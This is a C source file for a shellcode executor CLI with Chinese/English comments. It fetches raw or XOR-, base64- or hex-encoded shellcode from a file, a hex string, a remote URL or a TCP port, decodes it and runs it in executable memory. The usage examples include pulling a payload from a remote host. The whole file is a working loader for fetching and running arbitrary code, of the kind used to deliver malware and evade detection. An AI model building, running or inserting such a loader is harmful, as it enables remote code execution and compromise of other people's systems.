/**
 * @file    main.c
 * @brief   Shellcode Executor CLI 入口 / CLI Entry Point
 *
 * 用法 / Usage:
 *   scloader-cli [options] <shellcode_file>
 *
 * 选项 / Options:
 *   -h, --help           显示帮助 / Show this help message
 *   -v, --version        显示版本 / Show version information
 *   -m, --method <m>     加载方式: direct|thread|fiber|apc
 *   -e, --encode <t>     编码类型: xor|base64|hex
 *   -k, --key <k>        XOR 密钥 / XOR encoding key
 *   -r, --remote <url>   从远程 URL 拉取 / Fetch from remote URL
 *   -x, --hex <hex>      Hex 字符串形式的 shellcode
 *   -i, --info           显示内存信息 / Display memory info
 *   -d, --dump           执行前 hex dump / Hex dump before executing
 *   -p, --port <port>    远程 TCP 端口 / TCP port for remote
 *   --no-clear           执行后不清零 / Don't clear memory after execution
 *
 * 示例 / Examples:
 *   scloader-cli -x "90 90 CC"              # NOP sled + int3
 *   scloader-cli shellcode.bin               # 从文件加载 / Load from file
 *   scloader-cli -r http://example.com/sc    # 远程拉取 / Remote fetch
 *   scloader-cli -e xor -k 0xAA sc.bin       # XOR 解码后执行
 */

#include "scloader.h"
#include <stdio.h>
#include <stdlib.h>

/* Windows: 强制控制台使用 UTF-8 编码，防止中文乱码
 * Force console to UTF-8 on Windows to prevent garbled Chinese */
#ifdef _WIN32
#include <windows.h>
#define INIT_CONSOLE() SetConsoleOutputCP(CP_UTF8)
#else
#define INIT_CONSOLE()
#endif
#include <string.h>
#include <getopt.h>

/* ═══════════════════════════════════════════════
 * 帮助和版本信息 / Help & Version
 * ═══════════════════════════════════════════════ */
static void print_usage(const char *prog)
{
    printf("Shellcode Executor v%s\n", SCLOADER_VERSION_STRING);
    printf("跨平台 Shellcode 加载、编码与执行框架\n");
    printf("Cross-platform shellcode loading, encoding, and execution framework\n\n");
    printf("用法 / Usage: %s [options] <shellcode_file>\n\n", prog);
    printf("选项 / Options:\n");
    printf("  -h, --help            显示帮助 / Show this help\n");
    printf("  -v, --version         显示版本 / Show version\n");
    printf("  -m, --method <m>      加载方式: direct|thread|fiber|apc\n");
    printf("  -e, --encode <t>      编码类型: xor|base64|hex\n");
    printf("  -k, --key <k>         XOR 密钥(hex或字符串) / XOR key\n");
    printf("  -r, --remote <url>    从 URL 拉取 / Fetch from URL\n");
    printf("  -x, --hex <hex>       Hex 格式的 shellcode\n");
    printf("  -i, --info            显示内存信息 / Memory info\n");
    printf("  -d, --dump            Hex dump shellcode\n");
    printf("  -p, --port <port>     TCP 端口 / TCP port\n");
    printf("  --no-clear            执行后不清零 / No memory clear\n\n");
    printf("示例 / Examples:\n");
    printf("  %s -x \"90 90 CC\"\n", prog);
    printf("  %s shellcode.bin\n", prog);
    printf("  %s -r http://example.com/payload\n", prog);
    printf("  %s -e xor -k AA shellcode.enc\n", prog);
}

static void print_version(void)
{
    printf("Shellcode Executor v%s\n", SCLOADER_VERSION_STRING);
    printf("平台 / Platform: ");
#if SCLOADER_PLATFORM_WINDOWS
    printf("Windows");
#elif SCLOADER_PLATFORM_MACOS
    printf("macOS");
#elif SCLOADER_PLATFORM_LINUX
    printf("Linux");
#endif
    printf("\n");
    printf("构建时间 / Build: %s %s\n", __DATE__, __TIME__);
}

/* ═══════════════════════════════════════════════
 * Shellcode 加载辅助函数 / Loading Helpers
 * ═══════════════════════════════════════════════ */

/**
 * 从文件读取二进制数据 / Read binary data from file
 */
static unsigned char *read_file(const char *path, size_t *size)
{
    FILE *fp = fopen(path, "rb");
    if (!fp) {
        perror("fopen");
        return NULL;
    }

    fseek(fp, 0, SEEK_END);
    long file_size = ftell(fp);
    if (file_size <= 0) {
        fclose(fp);
        fprintf(stderr, "错误 / Error: 文件为空或无效 / empty or invalid file\n");
        return NULL;
    }
    rewind(fp);

    unsigned char *buf = (unsigned char *)malloc((size_t)file_size);
    if (!buf) {
        fclose(fp);
        fprintf(stderr, "错误 / Error: 内存分配失败 / memory allocation failed\n");
        return NULL;
    }

    size_t read_size = fread(buf, 1, (size_t)file_size, fp);
    fclose(fp);

    if ((long)read_size != file_size) {
        free(buf);
        fprintf(stderr, "错误 / Error: 文件读取失败 / failed to read file\n");
        return NULL;
    }

    *size = read_size;
    return buf;
}

/**
 * 解析编码类型字符串 / Parse encoding type string
 */
static scl_enc_type_t parse_enc_type(const char *type_str)
{
    if (strcmp(type_str, "xor") == 0)     return SCL_ENC_XOR;
    if (strcmp(type_str, "base64") == 0)  return SCL_ENC_BASE64;
    if (strcmp(type_str, "hex") == 0)     return SCL_ENC_HEX;
    return SCL_ENC_NONE;
}

/**
 * 解析加载方式字符串 / Parse loading method string
 */
static scl_load_method_t parse_method(const char *method_str)
{
    if (strcmp(method_str, "direct") == 0) return SCL_LOAD_DIRECT;
    if (strcmp(method_str, "thread") == 0) return SCL_LOAD_THREAD;
    return SCL_LOAD_DIRECT;
}

/* ═══════════════════════════════════════════════
 * Shellcode 执行 / Shellcode Execution
 * ═══════════════════════════════════════════════ */

static int execute_shellcode(unsigned char *shellcode, size_t size,
                              const scl_loader_config_t *config,
                              bool do_dump)
{
    if (do_dump) {
        scl_hex_dump(shellcode, size, "Shellcode Payload");
    }

    printf("[*] 分配可执行内存 / Allocating executable memory...\n");
    printf("[*] Shellcode 大小 / Size: %zu bytes\n", size);
    printf("[*] 正在执行 / Executing shellcode...\n\n");

    scl_status_t status = scl_load_and_exec(shellcode, size, config);

    if (status == SCL_OK) {
        printf("\n[*] Shellcode 执行成功 / Executed successfully.\n");
        return 0;
    } else {
        fprintf(stderr, "\n[!] 执行失败 / Execution failed, 状态码 / status: %d\n", status);
        return 1;
    }
}

/* ═══════════════════════════════════════════════
 * 主函数 / Main
 * ═══════════════════════════════════════════════ */
int main(int argc, char *argv[])
{
    INIT_CONSOLE();
    /* 命令行参数解析 / Option parsing */
    static struct option long_opts[] = {
        {"help",     no_argument,       0, 'h'},
        {"version",  no_argument,       0, 'v'},
        {"method",   required_argument, 0, 'm'},
        {"encode",   required_argument, 0, 'e'},
        {"key",      required_argument, 0, 'k'},
        {"remote",   required_argument, 0, 'r'},
        {"hex",      required_argument, 0, 'x'},
        {"info",     no_argument,       0, 'i'},
        {"dump",     no_argument,       0, 'd'},
        {"port",     required_argument, 0, 'p'},
        {"no-clear", no_argument,       0, 256},
        {0, 0, 0, 0}
    };

    scl_loader_config_t config = SCL_LOADER_CONFIG_DEFAULT;
    scl_enc_type_t enc_type = SCL_ENC_NONE;
    unsigned char xor_key[256];
    size_t xor_key_size = 0;
    const char *remote_url = NULL;
    const char *hex_input = NULL;
    bool do_dump = false;
    bool show_info = false;
    uint16_t tcp_port = 0;

    int opt;
    while ((opt = getopt_long(argc, argv, "hvm:e:k:r:x:idp:",
                               long_opts, NULL)) != -1) {
        switch (opt) {
            case 'h': print_usage(argv[0]); return 0;
            case 'v': print_version();      return 0;
            case 'm': config.method = parse_method(optarg); break;
            case 'e': enc_type = parse_enc_type(optarg); break;
            case 'k':
                xor_key_size = strlen(optarg);
                if (xor_key_size > sizeof(xor_key)) xor_key_size = sizeof(xor_key);
                memcpy(xor_key, optarg, xor_key_size);
                break;
            case 'r': remote_url = optarg; break;
            case 'x': hex_input = optarg; break;
            case 'i': show_info = true; break;
            case 'd': do_dump = true; break;
            case 'p': tcp_port = (uint16_t)atoi(optarg); break;
            case 256: config.clear_after = false; break;
            default: print_usage(argv[0]); return 1;
        }
    }

    /* 如果请求显示内存信息 / Show memory info if requested */
    if (show_info) {
        scl_print_memory_info(NULL);
        return 0;
    }

    /* 收集 shellcode / Collect shellcode */
    unsigned char *shellcode = NULL;
    size_t shellcode_size = 0;
    bool needs_free = true;

    if (remote_url) {
        /* 从远程拉取 / Remote fetch */
        printf("[*] 正在从远程拉取 shellcode / Fetching from: %s\n", remote_url);
        scl_status_t status;

        if (tcp_port > 0) {
            status = scl_remote_fetch_tcp(remote_url, tcp_port, 65536,
                                          &shellcode, &shellcode_size);
        } else {
            status = scl_remote_fetch(remote_url, &shellcode, &shellcode_size);
        }

        if (status != SCL_OK) {
            fprintf(stderr, "[!] 远程拉取失败 / Remote fetch failed\n");
            return 1;
        }
        printf("[+] 收到 / Received %zu bytes\n", shellcode_size);
    } else if (hex_input) {
        /* Hex 字符串输入 / Hex string input */
        size_t max_bytes = strlen(hex_input) / 2 + 1;
        shellcode = (unsigned char *)malloc(max_bytes);
        if (!shellcode) {
            fprintf(stderr, "[!] 内存分配失败 / Memory allocation failed\n");
            return 1;
        }
        scl_status_t status = scl_hex_to_bytes(hex_input, shellcode,
                                                max_bytes, &shellcode_size);
        if (status != SCL_OK) {
            fprintf(stderr, "[!] 无效的 hex 字符串 / Invalid hex string\n");
            free(shellcode);
            return 1;
        }
    } else if (optind < argc) {
        /* 从文件加载 / File input */
        shellcode = read_file(argv[optind], &shellcode_size);
        if (!shellcode) {
            return 1;
        }
    } else {
        /* 无输入 - 显示帮助 / No input - show help */
        print_usage(argv[0]);
        return 1;
    }

    /* 如有需要，先解码 / Decode if necessary */
    if (enc_type != SCL_ENC_NONE && shellcode) {
        unsigned char *decoded = NULL;
        size_t decoded_size = 0;

        scl_status_t status = scl_decode(enc_type, shellcode, shellcode_size,
                                          xor_key, xor_key_size,
                                          &decoded, &decoded_size);
        if (needs_free) free(shellcode);
        shellcode = decoded;
        shellcode_size = decoded_size;
        needs_free = true;

        if (status != SCL_OK) {
            fprintf(stderr, "[!] 解码失败 / Decoding failed\n");
            if (shellcode) free(shellcode);
            return 1;
        }
        printf("[+] 解码完成 / Decoded: %zu bytes\n", shellcode_size);
    }

    /* 执行 / Execute */
    int ret = execute_shellcode(shellcode, shellcode_size, &config, do_dump);

    if (needs_free && shellcode) {
        free(shellcode);
    }

    return ret;
}